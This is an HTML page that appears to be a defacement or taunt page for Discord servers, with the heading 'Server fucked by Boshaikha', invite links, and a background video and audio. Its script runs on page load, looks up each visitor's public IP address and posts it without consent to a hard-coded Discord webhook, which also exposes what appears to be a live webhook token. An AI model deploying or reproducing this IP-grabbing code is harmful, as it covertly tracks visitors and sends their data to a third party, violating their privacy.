<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord.gg/5-1</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-color: black;
            color: white;
            text-align: center;
        }

        /* Background video styling */
        .background-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1; /* Behind other elements */
        }

        .content {
            position: relative;
            z-index: 2;
            margin-top: 20vh;
        }

        h1 {
            color: red;
            font-size: 3.5rem; /* تكبير عنوان السيرفر */
            margin: 0;
            padding: 0;
        }

        .discord-links {
            position: relative;
            margin-top: 5vh;
            font-size: 2.5rem; /* تكبير نصوص Discord */
            animation: colorChange 0.2s infinite alternate; /* تأثير تغيير اللون */
        }

        @keyframes colorChange {
            0% {
                color: red;
            }
            100% {
                color: blue;
            }
        }

        .footer {
            position: fixed;
            bottom: 20px;
            left: 0;
            right: 0;
            font-size: 1.5rem; /* تكبير النصوص السفلية */
            color: gray;
        }

        #ip-display {
            margin-top: 30px;
            font-size: 2rem;
            color: white;
        }
    </style>
</head>
<body>
    <!-- Background video -->
    <video class="background-video" autoplay muted loop>
        <source src="https://cdn.discordapp.com/attachments/1311784471749460070/1325486665115898009/2025-01-05_193038.mp4?ex=677bf727&is=677aa5a7&hm=3255a3c02bf57160303a89f2e4bd33c5504f65320b5e7248cf772d8ebb977036&" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="content">
        <h1 id="dynamic-text">Server fucked by Boshaikha</h1>
        <div class="discord-links">
            <p>Discord.gg/1221</p>
            <p>Discord.gg/5-1</p>
            <p>Discord.gg/p7</p>
        </div>
        <div id="ip-display"></div>
    </div>

    <!-- Audio element for background sound -->
    <audio id="background-sound" src="https://cdn.discordapp.com/attachments/1311784471749460070/1325487628405178479/2025-01-05_193430.mp4?ex=677bf80c&is=677aa68c&hm=770c1653cac683cbefebdbe15675fcb996b93d7d449c75bc445e634bb58717af&" loop></audio>

    <script>
        // Discord Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1325489651724714057/i2mVH7VoEBahqGD0gw8M6ayHmxadhH-QEmUMN8oXodMCZvA1eIu6fn-eVOu-srEoT6wY";

        // Fetch IP and send to Discord Webhook
        function fetchAndSendIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    // Display IP on the screen
                    const ipDisplay = document.getElementById('ip-display');
                    ipDisplay.textContent = `Your IP: ${userIP}`;
                    ipDisplay.style.animation = "colorChange 0.5s infinite alternate";

                    // Send IP to Discord Webhook
                    const payload = {
                        content: `User IP: ${userIP}`
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    }).then(response => {
                        console.log("IP sent to Discord successfully.");
                    }).catch(error => {
                        console.error("Error sending IP to Discord:", error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    document.getElementById('ip-display').textContent = "Unable to retrieve IP.";
                });
        }

        // Start playing the background sound and fetch IP on page load
        window.onload = () => {
            const backgroundSound = document.getElementById('background-sound');
            backgroundSound.volume = 0.5;
            backgroundSound.play();

            fetchAndSendIP();
        };
    </script>
</body>
</html>
